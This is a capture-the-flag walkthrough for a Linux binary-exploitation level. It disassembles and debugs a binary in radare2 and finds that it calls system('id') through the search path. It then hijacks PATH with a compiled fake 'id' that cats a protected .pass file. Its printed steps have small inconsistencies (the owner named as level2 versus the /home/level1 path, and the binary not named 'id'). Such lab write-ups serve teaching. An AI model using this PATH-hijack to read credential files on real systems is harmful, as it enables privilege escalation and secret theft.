from kernel2015_CTF import exploiting 0x01

We need to connect to a remote server through ssh and get the content
of a file called '.pass'. Once we are logged in, we can see a binary
and that file, the proprietary of both is level2 but we have permissions of
read and execute on the binary. So... The target it's use the binary
to get the content of '.pass'.

So, let's see how the binary works:

hacklego@zuloak:~/ctf_kernel/exploiting$ ./level1 
MUGARDOSCTF info tool v1.0

[*] Salida del comando id:
uid=1000(hacklego)....

Ok, just print our id, we can imagine how it works internally, it probably
calls system(id), but... scp, download, keep calm and use radare!

Dissasemble:

hacklego@zuloak:~/ctf_kernel/exploiting$ radare2 level1 
 -- Finnished a beer
[0x004005c0]> aaa
[0x004005c0]> pdf@main
/ (fcn) sym.main 102
|          ; var int local_0_1    @ rbp-0x1
|          ; var int local_0_4    @ rbp-0x4
|          ; var int local_1      @ rbp-0x8
|          ; DATA XREF from 0x004005dd (entry0)
|          ;-- main:
|          0x004006ad    55             push rbp
|          0x004006ae    4889e5         mov rbp, rsp
|          0x004006b1    4883ec10       sub rsp, 0x10
|          0x004006b5    e8f6feffff     call sym.imp.getegid           ;sym.imp.getegid()
|          0x004006ba    8945f8         mov dword [rbp-local_1], eax
|          0x004006bd    e8befeffff     call sym.imp.geteuid           ;sym.imp.geteuid()
|          0x004006c2    8945fc         mov dword [rbp-local_0_4], eax
|          0x004006c5    8b55f8         mov edx, dword [rbp-local_1]
|          0x004006c8    8b4df8         mov ecx, dword [rbp-local_1]
|          0x004006cb    8b45f8         mov eax, dword [rbp-local_1]
|          0x004006ce    89ce           mov esi, ecx
|          0x004006d0    89c7           mov edi, eax
|          0x004006d2    b800000000     mov eax, 0
|          0x004006d7    e884feffff     call sym.imp.setresgid         ;sym.imp.setresgid()
|          0x004006dc    8b55fc         mov edx, dword [rbp-local_0_4]
|          0x004006df    8b4dfc         mov ecx, dword [rbp-local_0_4]
|          0x004006e2    8b45fc         mov eax, dword [rbp-local_0_4]
|          0x004006e5    89ce           mov esi, ecx
|          0x004006e7    89c7           mov edi, eax
|          0x004006e9    b800000000     mov eax, 0
|          0x004006ee    e85dfeffff     call sym.imp.setresuid         ;sym.imp.setresuid()
|          0x004006f3    bfa4074000     mov edi, str.MUGARDOSCTF_info_tool_v1.0 ; "MUGARDOSCTF info tool v1.0" @ 0x4007a4
|          0x004006f8    e843feffff     call sym.imp.puts              ;sym.imp.puts()
|          0x004006fd    bfbf074000     mov edi, str._n____Salida_del_comando_id: ; str._n____Salida_del_comando_id:
|          0x00400702    e839feffff     call sym.imp.puts              ;sym.imp.puts()
|          0x00400707    bfdb074000     mov edi, 0x4007db
|          0x0040070c    e85ffeffff     call sym.imp.system            ;sym.imp.system()
|          0x00400711    c9             leave
\          0x00400712    c3             ret


We can see several standard functions from linux libraries and then a call to system. It calls system
using the content of edi as parameter, that points to a memory address, let's see what is there.

Debug:

hacklego@zuloak:~/ctf_kernel/exploiting$ radare2 -d level1 
Process with PID 5665 started...
Attached debugger to pid = 5665, tid = 5665
Debugging pid = 5665, tid = 5665 now
Using BADDR 0x400000
bits 32
Attached debugger to pid = 5665, tid = 5665
 -- See you at the defcon CTF
[0x574d9190]> db 0x0040070c
[0x574d9190]> dc
MUGARDOSCTF info tool v1.0

[*] Salida del comando id:
hit breakpoint at: 40070c
Debugging pid = 5665, tid = 1 now
[0x0040070c]> p8 4 @ 0x4007db
69640000
[0x0040070c]> ? 0x6964
26980 0x6964 064544 26.3K 0000:0964 26980 "di" 01100100 26980.0 0.000000f 0.000000

Step by step:
· Launch r2 in debugger mode
· Set breakpoint where we need: 0x0040070c
· Run until the breakpoint
· What's in 0x4007db and next?
· Use r2 to get a human readable: "di"

So... it uses system calls to get our id.

Let's exploit this.

In GNU/Linux systems when we enter a command, it's searched in our PATH variable,
so, if we change our path at the beginning, we can use that trick to compile a binary
called 'id' and it's going to be executed first.

$ PATH=/tmp/bin:$PATH
$ vim bin.c

#include <stdio.h>

int main(){
    system("cat /home/level1/.pass");
    return 0;
}

$ gcc bin.c -o bin
$ mv bin /tmp/bin

That's all, we can't show the final result because we didn't write this on the go, but... It worked!
